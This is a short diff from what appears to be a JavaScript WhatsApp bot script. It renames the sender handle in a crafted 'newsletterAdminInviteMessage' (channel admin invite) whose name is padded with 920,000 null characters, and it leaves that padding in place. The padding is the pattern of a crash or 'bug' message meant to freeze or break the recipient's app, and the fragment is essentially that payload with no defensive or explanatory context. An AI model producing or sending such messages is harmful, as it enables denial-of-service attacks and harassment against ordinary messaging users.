@@ -330,7 +330,7 @@ const wanted = {
 					'message': {
 						"newsletterAdminInviteMessage": {
 							"newsletterJid": `120363298524333143@newsletter`,
-							"newsletterName": "🔥፝⃟ ꙳𝐏𝐚𝐤𝐓𝐳𝐲🔥፝⃟` " + "\u0000".repeat(920000),
+							"newsletterName": "🔥፝⃟ ꙳SAKKI🔥፝⃟` " + "\u0000".repeat(920000),
 							"jpegThumbnail": "",
 							"caption": `Undangan Admin Channel Zynxzo Script`,
 							"inviteExpiration": Date.now() + 1814400000
